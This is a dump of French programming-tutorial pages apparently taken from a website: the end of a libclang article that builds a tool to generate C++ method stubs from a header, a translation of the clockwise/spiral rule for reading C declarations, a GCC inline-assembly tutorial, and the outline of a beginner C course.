-lclangTooling -lclangParse -lclangSema -lclangAnalysis -lclangRewriteFrontend -lclangRewriteCore -lclangEdit -lclangAST -lclangLex -lclangBasic -lclang -lllvm `llvm-config --libs asmparser bitreader support mc option` -lLLVM-3.3 Utilisation : ./app test.cpp -- -std=c++11 On dispose maintenant d'un programme qui ne fait strictement rien. Mais ceci va très bien tôt changer. Écriture d'un expander de header Contexte Le C++ dispose d'un système de header /fichier source. Les headers contiennent les déclarations des fonctions et classes, les fichiers sources les implémentations. De cette façon, quand on a besoin dans un autre fichier d'utiliser certaines choses, il suffit d'inclure le header pour que le compilateur sache ce qu'il en retourne. Cependant, ce système impose une certaine redondance. Une fois le header écrit, il faut ré-écrire quasiment tout. Prenons l'exemple du fichier suivant //A.h struct A { int foo ( double d , int x = 5 ); void bar (); }; il faut être capable de créer le fichier suivant //A.cpp int A :: foo ( double d , int x ) { } void A :: bar () { } C'est clairement un travail d'ordinateur Analyse Avant de s'attaquer au cœur du programme, il faut dans premier temps récupérer le nom de classe qu'on souhaite développer. Pour ce faire, pm va passer par le système d'option CommonOptionsParser . Rien de plus simple, il suffit d'utiliser la classe template cl::opt . La paramétrisation template permet de récupérer des options de n'importe quelle nature ( std::string , entier, booléen, ...). Son utilisation est simple : on précise le nom de l'option, sa visibilité par défaut dans l'aide et sa description. Puis on construit comme avant notre objet CommonOptionsParser . Après, si l'option a été passée, on peut récupérer sa valeur simplement via l'opérateur de conversion implicite vers son paramètre template. cl :: opt < std :: string > optClassToExpand ( \"cl-exp\" , cl :: NotHidden , cl :: desc ( \"Class to Expand\" )); CommonOptionsParser op ( argc , argv ); std :: string classToExpand = optClassToExpand ; Le passage du nom de la classe à étendre à la classe ExampleVisitor va se faire via une variable globale pour des raisons de simplicité. Écriture du visiteur Étant donné qu'on souhaite générer le code de fonctions membres, il parait logique de s'intéresser aux déclarations de nouveaux types. La fonctions appelée dans ce cas est CXXRecordDecl . Le paramètre qu'elle reçoit est un pointeur de type CXXRecordDecl . Il faut alors vérifier que le nom de classe correspond bien à celui de la classe à développer. On utilise pour cela la fonction getNameAsString . On va pouvoir ensuite itérer sur les fonctions membres de la classe avec avec method_begin et method_end . Pour implémenter une fonction, elle doit remplir 3 conditions : 1. Ne pas déjà avoir une implémentation, soit directement dans le header soit dans le fichier source. 2. Être fournie par le programmeur et non par le compilateur. Ceci concerne les fonctions automatiquement générée par le compilateur mais aussi en C++11 les fonctions marquées comme *delete* (qui ont une existence dans l'AST !) ou celles marquées comme *default*. 3. Ne pas être pure Le type CXXMethodDecl ,qui est le type sous-jacent aux itérateurs fournis par method_begin , dispose respectivement des fonctions hasBody , isUserProvided et isPure Comme expliqué plus haut, le premier point ne marche que parce qu'on gère la translation unit qu'une fois que celle ci a été entièrement parsée. Dans tous les cas, une fonction doit avoir un type de retour sauf si c'est un constructeur, destructeur, ou un opérateur de conversion, au quel cas il n'y a aucun type de retour. Ces fonctions un peu spéciales sont représentées par les types CXXConstructorDecl , CXXDestructorDecl et CXXConversionDecl qui dérivent de CXXMethodDecl . Il est donc nécessaire de tester si l'itérateur courant n'est pas de ce type. Pour ce faire, on dispose d'un RTTI propre à clang via de la fonction template isa<T>(Arg) qui va renvoyer vrai si Arg est du type T. On dispose aussi d'un analogue au dynamic_cast avec dyn_cast . On peut donc récupérer et ajouter le cas échéant le type de retour avec getResultType qu'il faut ensuite convertir en string avec getAsString . Le nom de la fonction s'obtient avec getNameAsString et on peut itérer à travers les paramètres via param_begin et param_end , récupérer type et nom de ces derniers avec getOriginalType().getAsString() et getNameAsString Il ne reste plus qu'a rajouter le const en fin de définition si la fonction est constante, chose qu'on sait via isConst Au final, le code de la fonction ressemble à ceci : virtual bool VisitCXXRecordDecl ( CXXRecordDecl * dd ) { if ( dd -> getNameAsString () != classToExpand ) return true ; const std :: string base = dd -> getNameAsString () + \"::\" ; for ( auto fct = dd -> method_begin (); fct != dd -> method_end (); ++ fct ) { if ( ! fct -> hasBody () && fct -> isUserProvided () && ! fct -> isPure ()) { std :: string r2 ; if ( ! ( isa < CXXConstructorDecl > ( * fct ) || isa < CXXDestructorDecl > ( * fct ) || isa < CXXConversionDecl > ( * fct ) ) ) { r2 += fct -> getResultType (). getAsString () + \" \" ; } r2 += base + fct -> getNameAsString () + \"(\" ; for ( auto param = fct -> param_begin (); param != fct -> param_end (); ++ param ) { r2 += ( * param ) -> getOriginalType (). getAsString () + \" \" + ( * param ) -> getNameAsString (); r2 += \",\" ; } if ( fct -> param_size () > 0 ) r2 . pop_back (); r2 += std :: string ( \")\" ) + ( fct -> isConst () ? \" const \" : \"\" ) + \" \\n { \\n } \\n \" ; off << r2 << std :: endl ; } } return true ; } Utilisation L'utilisation est assez simple. Une fois compilé, le programme s'utilise de la façon suivante : ./app test.cpp -cl-exp=C -- -std=c++11 avec test.cpp qui contient : #include \"header.hpp\" et header.hpp : struct A {}; class C { public : C (); ~ C (); void a (); void a ( int ); //nope, deleted C & operator = ( const C & ) = delete ; //nope, default C ( const C & c ) = default ; operator A (); void Z ( std :: string s = \"foobar\" ); //member static const int x ; //nope, has a body const double fct1 ( double chose = 5. ){ return 5. ;} //yes, not pure virtual const A fct3 ( const float & truc = 5. ) const ; //nope, pure virtual const A fct2 ( const float & truc ) const = 0 ; void foo () const ; //template, so no template < class T > void bar (); }; //-- C on arrive au fichier final suivant : #include \"header.hpp\" C :: C () { } C ::~ C () { } void C :: a () { } void C :: a ( int ) { } C :: operator A () { } void C :: Z ( std :: string s ) { } const struct A C :: fct3 ( const float & truc ) const { } void C :: foo () const { } Ce qui est déjà un très bon résultat vu la simplicité du coeur du code, qui tient sur moins de 50 lignes ! Conclusion J'espère que cet article vous aura convaincu de la puissance de libclang et de ses interfaces pour manipuler du code source et qu'il va vous encourager à écrire vos propre outils. Il existe de nombreuse améliorations possibles à notre petit programme: Gérer les classes imbriquées et les namespaces et avoir le choix su la manière d'écrire le code. Rajouter la possibilité de placer des commentaires pour rappeler les valeurs par défaut, la virtualité des fonctions, ... Ajouter une définition des membres static . Gérer les fonctions templates. Améliorer le résultat des types de retour (std::string devient std::basic_stream ) . Pour information, l'ensemble du projet (contenant une partie des améliorations sus-citées) est disponible sur Github Merci à lmghs, antoine1023, MicroJoe et les autres que j'oublie pour les relectures et conseils."},{"tags":"content","url":"https://yliesc.github.io/pages/pdp/content/la-regle-de-la-spirale-horaire-clockwisespiral-rule","title":"La règle de la \"spirale horaire\" (Clockwise/Spiral Rule)","text":"Texte initialement posté par email sur comp.lang.c par son auteur, David Anderson, le 6/5/1994. Example #1 : Simple déclaration Example #2 : Déclaration d'un pointeur sur fonction Exemple #3 : le \"Final\" Il existe une technique connue sous le nom de \"règle de la spirale horaire\" qui permet à tout programmeur C de parser toute déclaration C de tête ! Elle consiste à suivre trois étapes simples : En partant du premier élément inconnu, se déplacer en spirale dans le sens horaire; lorsqu'on rencontre l'élément suivant, le remplacer par son équivalent en langue naturelle : [X] ou [] → Tableau de taille X de… ou Tableau de taille indéfinie de… (type1, type2) → fonction recevant type1 et type2 retournant… * → pointeur(s) sur… Répéter l'étape 1. en spirale, dans le sens horaire, jusqu'à ce que tous les jetons ont été parcourus. Toujours résoudre les parenthèses en premier ! Example #1 : Simple déclaration ┌───────┐ │ ┌─┐ │ │ ▲ │ │ char *str[10]; ▲ ▲ │ │ │ └───┘ │ └───────────┘ La question qu'on se pose : Qu'est-ce que str ? str est un… On se déplace en spirale horaire commençant par str et le premier caractère qu'on rencontre est [ , il s'agit donc d'un tableau, donc… str est un tableau 10 de… Continuons en spirale horaire, et le prochain jeton que nous rencontrons est * , ce qui signifie que nous avons des pointeurs, donc… str est un tableau 10 de pointeurs sur… Toujours en spirale horaire, nous arrivons en fin de ligne (le ; ) et nous en continuant nous arrivons sur le type char , donc… str est un tableau 10 de pointeurs sur char Nous avons maintenant \"visité\" tous les jetons, nous avons donc fini ! Example #2 : Déclaration d'un pointeur sur fonction ┌────────────────────┐ │ ┌───┐ │ │ │┌─┐│ │ │ │▲ ││ │ char *(*fp)( int, float *); ▲ ▲ ▲ ││ │ │ │ └──┘│ │ │ └─────┘ │ └────────────────────────┘ La question qu'on se pose : Qu'est-ce que fp ? fp est un… En se déplaçant en spirale horaire, la première chose que l'on voit est ) ; ce qui signifie que fp est entre parenthèses, nous continuons donc notre spirale à l'intérieur de la parenthèse et le prochain caractère rencontré est * , donc… fp est un pointeur sur… Nous sommes désormais hors des parenthèses et continuons en spirale horaire, nous voyons ( , il s'agit d'une fonction donc… fp est un pointeur sur fonction recevant un int et un pointeur sur flottant retournant… Toujours en spirale, nous voyons * , donc… fp est un pointeur sur fonction recevant un int et un pointeur sur flottant retournant un pointeur sur… Suivant encore la spirale, nous voyons ; , mais nous n'avons pas encore visité tous les jetons, nous devons continuer et finalement tombons sur char, donc… fp est un pointeur sur fonction recevant un int et un pointeur sur flottant retournant un pointeur sur char. Exemple #3 : le \"Final\" ┌─────────────────────────────┐ │ ┌───┐ │ │ ┌───┐ │┌─┐│ │ │ ▲ │ │▲ ││ │ void (*signal(int, void (*fp)(int)))(int); ▲ ▲ │ ▲ ▲ ││ │ │ └──────┘ │ └──┘│ │ │ └────────┘ │ └──────────────────────────────────┘ La question que nous nous posons : Qu'est-ce signal ? Remarquez que signal est entre parenthèses, nous devons donc les résoudre en premier ! En se déplaçant dans le sens horaire, nous voyons ( , nous avons donc… signal est une fonction recevant un int et un… Hmmm, nous pouvons appliquer la même règle à fp , donc… Qu'est-ce que fp ? fp est aussi entre parenthèses, donc continuons et nous voyons une * , donc… fp est un pointeur sur… Continuons en spirale horaire et nous arrivons à ( , donc… fp est un pointeur sur une fonction recevant un int et retournant… Maintenant continous hors des parenthèses de la fonction et nous obtenons void , donc… fp est un pointeur sur une fonction recevant un int et ne retournant rien (void) Fini avec fp , retournons à notre signal , nous avons maintenant… signal est une fonction recevant un int et un pointeur sur une fonction recevant un int et ne retournant rien retournant… Nous sommes encore dans des parenthèses, donc le prochain caractère rencontré est * , donc… signal est une fonction recevant un int et un pointeur sur une fonction recevant un int et ne retournant rien retournant un pointeur sur… Nous avons maintenant résolu tous les jetons présents dans des parenthèses, continuons dans le sens horaire et arrivons à ( , donc… signal est une fonction recevant un int et un pointeur sur une fonction recevant un int et ne retournant rien retournant un pointeur sur une fonction recevant un int et retournant… Finalement, nous continuons et la seule chose restante et le mot void , et donc la définition complète de signal est : signal est une fonction recevant un int et un pointeur sur une fonction recevant un int et ne retournant rien retournant un pointeur sur une fonction recevant un int et ne retournant rien (void). La même règle s'applique à const et volatile . Par exemple : const char *chptr; Qu'est-ce que chptr ? chptr est un pointeur sur un char constant Que dites-vous de ça : char * const chptr; Qu'est-ce que chptr ? chptr est un pointeur constant sur un char Finalement : volatile char * const chptr; Qu'est-ce que chptr ? chptr est un pointeur constant sur un char volatile. Vous pouvez vous entrainer en appliquant cette règle aux exemples du K&R II, page 122. Copyright © 1993,1994 David Anderson Traduction © 2013 victor / progdupeu.pl Cet article peut être librement distribué à condition que les noms des auteurs et cette notice soient conservés. Librement traduit sur la base de cette reproduction du texte original."},{"tags":"content","url":"https://yliesc.github.io/pages/pdp/content/lassembleur-avec-gcc","title":"L'assembleur avec GCC","text":"Connaissez-vous les fonctions inline ? On les utilise pour optimiser un code, puisque l'appel de la fonction est remplacé par le corps de la fonction elle-même. Pour ceux qui connaissent le C, c'est dans le même principe que les macros. En général, on écrit des fonctions inlines dans le même langage que le reste du code. En général ... car il est possible d'écrire des fonctions en assembleur depuis un code C. A quoi ça peut servir ? Allier la puissance de l'assembleur avec le côté pratique du C. La syntaxe AT&T Assembleur basique L'assembleur étendu Plus d'opérandes, de contraintes et de clobber list volatile goto Variables globales et fonctions Exemples Mise à zéro de bit strcpy Des instructions inaccessibles ? Utiliser la syntaxe Intel La syntaxe AT&T Avant de commencer, il est important de faire un point sur la syntaxe AT&T. En effet, celle-ci est moins courante que la syntaxe Intel et diffère pas mal. Voici une liste des différences majeures entre les deux syntaxes. Sachez néanmoins que même si vous n'êtes pas familier ou à l'aise avec cette syntaxe, cela ne sera pas gênant pour comprendre la suite. Ordre source / destination : le premier argument d'une instruction sera toujours l'opérande source et le deuxième l'opérande destination. Ceux qui connaissent la syntaxe Intel savent que l'ordre est inversé : destination puis source. Le nom des registres : les registres sont précédés par % . cmp eax, ecx ; syntaxe Intel cmp %eax, %ecx ; syntaxe AT&T Opérande immédiate (c'est à dire une constante ou le résultat d'une expression constante) : une opérande immédiate est toujours précédée par $ , ainsi que les variables statiques C. De plus, les valeurs hexadécimales qui commençaient par un h avec la syntaxe Intel commencent désormais par 0x . mov eax, 1 ; syntaxe Intel movl $1, %eax ; syntaxe AT&T mov ebx, 0ffh ; syntaxe Intel movl $0xff, %ebx ; syntaxe AT&T Taille des opérandes : la taille d'une opérande est connue en regardant la dernière lettre d'un opérande : les suffixes sont b (byte - 8 bits), w (word - 16 bits) et l (double word - 32 bits). Avec la syntaxe Intel, on aurait ajouté byte ptr , word ptr et dword ptr devant les opérandes. mov al, byte ptr foo ; syntaxe Intel movb foo, %al ; syntaxe AT&T Opérande mémoire : la syntaxe Intel utilise les crochets [ et ], la syntaxe AT&T utilise les parenthèses ( et ). Par conséquence, l'accès indirect à la mémoire passe de section:[base + index * scale + disp] à section:disp(base, index, scale) . Les constantes utilisées pour disp et scale ne doivent pas être préfixées de $ . sub eax, [ebx + ecx * 4h - 20h] ; syntaxe Intel subl -0x20(%ebx, %ecx, 0x4), %eax ; syntaxe AT&T Assembleur basique Un bloc de code assembleur se déclare grâce au mot-clef __asm__ et se place entre parenthèse, avec un point-virgule après la parenthèse fermante. Il existe un autre mot-clef, asm , mais celui-ci peut créer des conflits avec certaines options de compilation comme -ansi . -ansi and the various -std options disable certain keywords. This causes trouble when you want to use GNU C extensions, or a general-purpose header file that should be usable by all programs, including ISO C programs. The keywords asm, typeof and inline are not available in programs compiled with -ansi or -std (although inline can be used in a program compiled with -std=c99 or -std=c11). -- Site de GCC Chaque instruction se déclare entre guillemets et doit être finie par \\n\\t . Cela permet de formater correctement les instructions pour les envoyer à Gas , l'assembleur de GCC. Voici un exemple basique. __asm__ ( \"movl %eax, %ebx \\n\\t \" \"movl $56, %esi \\n\\t \" \"movb %ah, (%ebx)\" ); Cependant, en l'état actuel des choses, ça reste assez limité. En effet, non seulement on ne peut pas interagir avec des variables, mais si en plus on modifie des registres qui étaient utilisés par le programme avant l'appel des routines assembleur, comment le signaler au compilateur ? Heureusement, l'assembleur inline est bien plus puissant que ça. L'assembleur étendu L'assembleur étendu va nous permettre de spécifier des opérandes d'entrées, de sorties et les registres utilisés. On va aussi permettre à GCC de bien comprendre le code pour tenter si possible de l'optimiser. Mais commençons par le commencement, la syntaxe. __asm__ ( /* instructions assembleur */ : opérandes de sortie /* optionnel */ : opérandes d'entrée /* optionnel */ : liste des registres \"pollués\" ou clobber list /* optionnel */ ); Chaque opérande est constituée d'une contrainte d'opérande entre guillemets suivi d'une expression en C (variable, calcul, etc) entre parenthèses. Les opérandes sont séparées entre elles par des virgules. Par contre, le maximum total d'opérandes est limité à 10, ou plus si la machine le permet (voir les spécifications), mais vous n'aurez que très rarement le cas de dépasser ce nombre. Les contraintes d'opérandes sont les suivantes : \"r\" : dans n'importe quel registre (eax, ebx, etc) ; \"a\" : spécifiques aux registres eax, ax et al ; \"b\" : spécifiques aux registres ebx, bx et bl ; \"c\" : spécifiques aux registres ecx, cx et cl ; \"d\" : spécifiques aux registres edx, dx et dl ; \"S\" : pour les registres esi et si ; \"D\" : pour les registres edi et di ; \"m\" : lorsque l'opérateur est dans la mémoire ; on peut donc effectuer des opérations directement sur l'adresse mémoire sans avoir à passer par un registre. Cependant, il n'est recommandé d'utiliser cette contrainte que si elle est vraiment nécessaire ou si elle accélère suffisamment le processus (une donnée trop grosse pour rentrer d'un coup dans un registre). Par exemple dans un OS, l'IDT définie par le noyau peut être chargée ainsi : __asm__ ( \"lidt %0 \\n\\t \" : /* pas de sortie */ : \"m\" ( idt )); g : pour utiliser n'importe quel registre général, adresse ou entier disponible. Il en existe également d'autres spécifiques à l'architecture x86 : \"f\" : pour un registre flottant ; \"t\" : pour le premier registre flottant ; \"u\" : pour le second registre flottant ; \"q\" : registre a, b, c ou d En plus de ces contraintes, il existe également des modificateurs de contrainte : \"=\" : signifie que l'opérande est en écriture seule pour cette instruction, la valeur précédente est éliminée et remplacée par des données de sortie. Ce modificateur est utilisé pour les opérandes de sortie. \"&\" : signifie que l'opérande sera modifiée avant la fin de la lecture de toutes les opérandes d'entrées par l'instruction en cours. Si l'opérande n'est pas modifiée avant la fin de la lecture, alors le modificateur est ignoré. \"=&\" : c'est la combinaison des deux précédents. Le troisième paramètre est quant à lui la liste des registres utilisés dans le code assembleur sans compter les opérandes d'entrée et de sortie. Elle permet d'indiquer à GCC que nous gérons nous-mêmes ces registres. Ainsi, GCC ne vérifiera pas si la valeur chargée dans ces registres est valide, et il ne tentera pas non plus d'y stocker des valeurs tant que nous n'avons pas fini. Par contre, GCC connait les registres utilisés par les opérandes d'entrée et de sortie, il ne faut donc pas les préciser. Il est temps de tout récapituler par un exemple. Prenons ce code qui additionne deux variables. int main ( void ) { int foo = 10 , bar = 15 ; __asm__ ( \"addl %%ebx, %%eax\" : \"=a\" ( foo ) : \"a\" ( foo ), \"b\" ( bar ) ); printf ( \"foo += bar = %d \\n \" , foo ); return 0 ; } On demande dans cette exemple de stocker la variable foo dans le registre eax ( \"a\"(foo) ), et la variable bar dans le registre ebx ( \"b\"(bar) ), puis on demande d'additionner les deux registres et de stocker le résultat dans la variable foo ( \"=a\"(foo) ). On remarque ici que la liste des registres pollués n'est pas précisée puisque les deux registres utilisés sont déjà connus d'avance par GCC, car ils sont utilisés par les opérandes de sortie / d'entrée. Plus d'opérandes, de contraintes et de clobber list Il faut aussi préciser que pour un nombre $x$ d'opérateurs (à la fois d'entrée et de sortie), alors le premier opérande de sortie est numéroté 0, et le dernier opérande d'entrée est numéroté $x - 1$. Cela nous permet de manipuler directement nos variables dans le code assembleur, au contraire du code précédent où nous sommes passés par des registres bien spécifiques. Illustrons ce nouveau concept par un code. int main ( void ) { int a = 10 , b = 0 ; __asm__ ( \"movl %1, %%eax \\n\\t \" \"movl %%eax, %0 \\n\\t \" : \"=r\" ( b ) : \"r\" ( a ) : \"%eax\" ); printf ( \"b = %d \\n \" , b ); return 0 ; } Il y a deux opérandes, donc \"=r\"(b) est l'opérande 0, représentée par %0 , et \"r\"(a) l'opérande 1, représentée par %1 . Le code charge donc la variable a et stocker son contenu dans eax , qui est lui même copié dans la variable b . Ainsi à la fin de l'instruction, la variable a et la variable b valent toutes deux 10. Cela nous permet de manipuler plus précisément les opérandes d'entrées et de sorties. On l'utilise dans les cas suivants. Dans le cas où on lit une variable pour écrire le résultat dans cette même variable. Dans les cas où il n'est pas nécessaires de séparer les instances d'entrées et de sorties. Cette possibilité s'étend également aux contraintes des opérandes. En effet, pour une opérande d'entrée, une contrainte composée d'un chiffre $x$ qui signifie \"cette entrée a les mêmes contraintes que la $x&#94;{ème}$ opérande de sortie\". Cette technique est utilisée si on veut que l'opérande d'entrée et l'opérande de sortie soient stockées dans le même registre. Prenons un exemple. int main ( void ) { int a = 10 , b = 25 ; __asm__ ( \"addl %2, %%eax \\n\\t \" : \"=a\" ( a ) : \"0\" ( a ), \"b\" ( b ) ); printf ( \"a += b = %d\" , a ); return 0 ; } Dans ce code, on demande à ce que l'opérande d'entrée 0 ait les mêmes contraintes que la $0&#94;{ème}$ opérande de sortie (soit \"=a\" ). Ainsi, les deux variables seront stockées dans le registre eax . Sans cette technique, il aurait fallu préciser que l'opérande d'entrée 0 devait être stockée dans le registre eax . Je termine cette sous-partie en ajoutant des précisions sur la liste des registres pollués. Si l'instruction modifie le registre de condition de code, alors il faut rajouter \"cc\" à cette liste. Si l'instruction modifie la mémoire de manière imprévisible, il faut ajouter \"memory\" à la liste. Si la mémoire modifiée n'est pas listée dans les opérandes d'entrée ou de sortie, il faut alors rajouter le mot-clef volatile . volatile Ce mot-clef est bien connu des programmeurs systèmes. Il permet de définir une variable de façon à ce que celle-ci ne puisse pas être placée dans un registre du processeur, mais en mémoire. Dans le cas de l'assembleur inline, il sert à empêcher les optimisations que pourrait faire GCC. Pour le forcer à respecter ce qu'on a écrit à la lettre on utilise ce mot-clef, ou plutôt sa variante __volatile__ , que l'on place juste après __asm__ . Il est à noter que s'il n'est pas nécessaire (dans le cas de calculs, ou si le code ne produit aucun effet de bord), il ne sert à rien de le mettre : il est mieux de laisser GCC optimiser le code. goto Sachez également que depuis la version 4.5 de GCC il est possible d'utiliser goto sur des blocs d'assembleur. La syntaxe pour les utiliser est la suivante : __asm__ goto ( \"jmp %l[labelname]\" : : : \"memory\" : labelname /* n'importe quel label utilisé */ ); Voici un exemple tiré du code source de GNU/Linux (attention les yeux, ça risque de piquer un peu). // Works for both 32 and 64 bit #include <stdint.h> #define cmpxchg( ptr, _old, _new, fail_label ) { \\ volatile uint32_t *__ptr = (volatile uint32_t *)(ptr); \\ asm goto( \"lock; cmpxchg %1,%0 \\t\\n\" \\ \"jnz %l[\" #fail_label \"] \\t\\n\" \\ : /* empty */ \\ : \"m\" (*__ptr), \"r\" (_new), \"a\" (_old) \\ : \"memory\", \"cc\" \\ : fail_label ); \\ } Variables globales et fonctions Depuis tout à l'heure, nous n'avons vu que le chargement de variables locales à une fonction. Il est pourtant possible de charger des variables globales, et c'est même encore plus facile ! En effet, il suffit d'écrire directement dans le code ceci : _ID , sans même passer par les opérandes d'entrées et de sortie. Exemple. int b = 25 ; int main ( void ) { int a = 10 ; __asm__ ( \"addl _b, %%eax \\n\\t \" : \"=a\" ( a ) : \"0\" ( a ) ); printf ( \"a += b = %d\" , a ); return 0 ; } Il est de même pour les appels de fonctions. Voici un exemple appelant la fonction puts . const char * str = \"Hello world!\" ; int main ( void ) { __asm__ ( \"movl _str, %eax \\n\\t \" \"pushl %eax \\n\\t \" \"call _puts \\n\\t \" \"add $8, %esp \\n\\t \" \"leave \\n\\t \" \"ret \\n\\t \" ); return 0 ; } Exemples Pour illustrer cette grosse partie théorique, je vais prendre des exemples que j'ai pu voir sur Internet, accompagnés de quelques explications. Mise à zéro de bit __asm__ ( \"btsl %1,%0\" : \"=m\" ( ADDR ) : \"Ir\" ( pos ) : \"cc\" ); Ce code permet de mettre à 1 le bit numéro pos de l'adresse ADDR. Si on avait voulu mettre le bit à 0, on aurait utilisé l'instruction btr l. strcpy Ce code tiré de la Glibc de Linux est celui de la fonction strcpy . static inline char * strcpy ( char * dest , const char * src ) { int d0 , d1 , d2 ; __asm__ __volatile__ ( \"1: \\t lodsb \\n\\t \" \"stosb \\n\\t \" \"testb %%al,%%al \\n\\t \" \"jne 1b\" : \"=&S\" ( d0 ), \"=&D\" ( d1 ), \"=&a\" ( d2 ) : \"0\" ( src ), \"1\" ( dest ) : \"memory\" ); return dest ; } L'adresse de la chaîne source est située dans esi , celle de la chaîne de destination dans edi . Dès que l'on atteint 0, la copie est terminée. Les contraintes \"=&S\" , \"=&D\" , \"=&a\" indiquent que les registres esi , edi and eax seront utilisés, donc GCC ne stockera rien dedans. L'instruction lodsb charge dans le registre al l'octet adressé par di:si , si le flag DF vaut 0 après ça, si est incrémenté, sinon décrémenté. L'instruction stosb stocke le contenu de a l dans l'octet pointé par es:di , si le flag DF vaut 0 après ça, di est incrémenté, sinon décrémenté. Des instructions inaccessibles ? Il est fréquent lors de la création d'un système d'exploitation d'écrire sur divers ports (pour s'adresser au PIC par exemple), ou bien pour activer / désactiver les interruptions. Or il n'existe pas en C de fonction pour se faire. On a donc recours à l'assembleur inline. Dans cette exemple, on utilise des #define , ce qui s'avère pratique quand on appelle plusieurs fois la même instruction. /* désactive les interruptions */ #define cli __asm__(\"cli\"::) /* réactive les interruptions */ #define sti __asm__(\"sti\"::) /* écrit un octet sur un port */ #define outb(port, value) \\ __asm__ __volatile__ (\"outb %%al, %%dx\" :: \"d\" (port), \"a\" (value)); /* lit un octet sur un port */ #define inb(port)( \\ unsigned char _v; \\ __asm__ __volatile__ (\"inb %%dx, %%al\" : \"=a\" (_v) : \"d\" (port)); \\ _v; \\ }) Utiliser la syntaxe Intel Pour ceux qui maitriserait mal la syntaxe AT&T ou qui par gouts personnels préfèrent la syntaxe Intel, il est possible d'utiliser cette dernière. Pour cela, il suffit de rajouter deux lignes dans son code assembleur : \".intel_syntax noprefix\\n\\t\" au début et \".att_syntax\" à la fin. Toute instruction écrite entre ces deux lignes sera considérée comme utilisant la syntaxe Intel. Exemple. int a ; __asm__ ( \".intel_syntax noprefix \\n\\t \" \"mov ax, 2 \\n\\t \" \"shl ax, 2 \\n\\t \" \".att_syntax\" : \"=r\" ( a ) ); Concernant le passage en argument, la méthode est la même que pour la syntaxe AT&T. Exemple avec une variable globale puis un paramètre de fonction (la méthode est identique pour les variables locales). const char * const str = \"Hello world!\" ; void asm_print ( void ) { __asm__ ( \".intel_syntax noprefix \\n\\t \" \"mov eax, _str \\n\\t \" \"push eax \\n\\t \" \"call _puts \\n\\t \" \"add esp, 8 \\n\\t \" \"leave \\n\\t \" \"ret \\n\\t \" \".att_syntax\" ); } void asm_print_with_args ( const char * s ) { __asm__ ( \".intel_syntax noprefix \\n\\t \" \"push eax \\n\\t \" \"mov eax, %0 \\n\\t \" \"call _puts \\n\\t \" \"add esp, 8 \\n\\t \" \"leave \\n\\t \" \"ret \\n\\t \" \".att_syntax\" : : \"r\" ( s ) ); } Cet article n'a pas pour but d'être exhaustif, ce qui est impossible, mais plutôt de présenter une introduction à l'assembleur inline avec GCC. Pour continuer votre route, voici le document original duquel est tiré en grande partie cet article, ainsi qu'une liste de liens ."},{"tags":"content","url":"https://yliesc.github.io/pages/pdp/content/le-langage-c","title":"Le langage C","text":"Vous souhaitez apprendre à programmer, mais vous ne savez pas comment vous y prendre ? Ou bien vous voulez réviser ? Alors, permettez-nous de vous souhaiter la bienvenue dans ce cours de programmation en C pour débutants. La programmation est devenue aujourd'hui incontournable, si bien qu'elle est utilisée partout. Tous les logiciels de votre ordinateur ont été programmés. Et ce cours va vous apprendre les bases de la programmation en C pour vous permettre de créer des programmes à votre tour. Pour pouvoir suivre ce tutoriel, vous n'avez aucun pré-requis ; tout sera détaillé de la manière la plus complète possible. Nous commencerons par une introduction à la programmation et au C, puis nous avancerons peu à peu dans l'univers de la programmation, tout cela grâce à des cours, des exemples, des exercices d'applications et des travaux pratiques. Introduction Introduction à la programmation Avant-propos Esprit et but du tutoriel À qui est destiné ce tutoriel ? Allez plus loin La programmation, qu'est-ce que c'est ? Les programmes expliqués en long, en large et en travers Le langage C L'histoire du C Pourquoi apprendre le C ? La norme L'algorithmique Le pseudo-code Outils Windows Avec un IDE Code::Blocks Visual C++ Avec l'invite de commande Le compilateur L'éditeur de texte Compiler à la main avec l'invite de commande GNU/Linux - UNIX Les IDE La compilation en ligne de commande Mac OS Avec un IDE En ligne de commande Rencontre avec le C Notre cible Analyse du code source #include int main(void) Notions de base Les mots-clés Les opérateurs Expressions et instructions Les blocs d'instructions Les séparateurs L'indentation Les commentaires Les variables Qu'est-ce qu'une variable ? Mémoire La RAM Bytes et octets Adresse mémoire Références Variables Déclarer une variable Les types Capacité d'un type Taille d'un type Les identificateurs D'autres mots-clés const register volatile Déclaration et initialisation Initialisation Initialisation des nombres flottants Affectation Utiliser des variables Calculs de base Addition, soustraction et multiplication Division Modulo Opérations entre variables Les raccourcis Incrémentation et décrémentation Les conversions de type Les conversions explicites Les conversions implicites Perte d'information Manipulations basiques des entrées/sorties Les sorties printf — Écrire une chaîne de caractères de manière formatée Le scoop du jour Tabulations et compagnie Précision Sur plusieurs lignes puts — Écrire une chaîne de caractères putchar — Écrire un caractère Interagir avec l'utilisateur Exercice Les conditions Conditions et booléens Comparaisons Les booléens Exemple Les opérateurs logiques Les opérateurs logiques de base L'opérateur ET L'opérateur OU L'opérateur NON Évaluation en court-circuit Encore mieux ! Parenthèses La structure if L'instruction if Exemple numéro 1 Exemple numéro 2 L'instruction else Exemple If / else if Un petit exercice pour bien comprendre L'instruction switch L'opérateur ternaire Exercice Les boucles La boucle while Syntaxe Exemple Boucles infinies Exercice La boucle do-while Fonctionnement Syntaxe Exemple Autre exemple La boucle for Fonctionnement Syntaxe Exemple Exercice Utilisation avancée Plusieurs compteurs Boucles imbriquées Branchements inconditionnels break Boucle ou structure de contrôle simple Structures de contrôle imbriquées continue goto Exemple Goto Statement Considered Harmful Exercices Calcul du PGCD de deux nombres Énoncé Correction Une overdose de lapins Énoncé Indice Correction Des pieds et des mains pour convertir mille miles Votre mission Un indice ? Correction ! Puissances de trois Consignes Un indice ? Correction ! La disparition : le retour Votre mission Un indice ? Correction Les fonctions A quoi ca sert ? Sans fonctions Avec les fonctions Déclarer une fonction Déclarer une fonction void Paramètres Exemples Le corps d'une fonction return Variables locales Exemple Utiliser une fonction Appel de fonctions Les prototypes Exercices Afficher un rectangle Correction Afficher un triangle Correction Coupure Correction Découper son projet Portée et masquage La notion de portée Au niveau d'un bloc Au niveau d'un fichier La notion de masquage Diviser pour mieux régner Création d'un nouveau fichier source Pour Code::Blocks Pour Visual Studio Pour Xcode Compilation manuelle Les fonctions Les variables On m'aurait donc menti ? Les fichiers d'en-têtes Le préprocesseur Le fonctionnement du préprocesseur Qu'est-ce que le préprocesseur ? Exemple d'utilisation avec les inclusions Une directive : #define Des macros simples Une définition simple Macros dans d'autres macros D'autres définitions Avec paramètre(s) Les inconvénients Sur plusieurs lignes Des macros sans définition Des directives de condition Les directives #if, #elif, #else et #endif defined Les directives #ifdef et #ifndef Sécurisation d'un fichier d'en-tête Constantes pré-définies Macros standards Détecter le compilateur et le système Systèmes d'exploitation Compilateurs 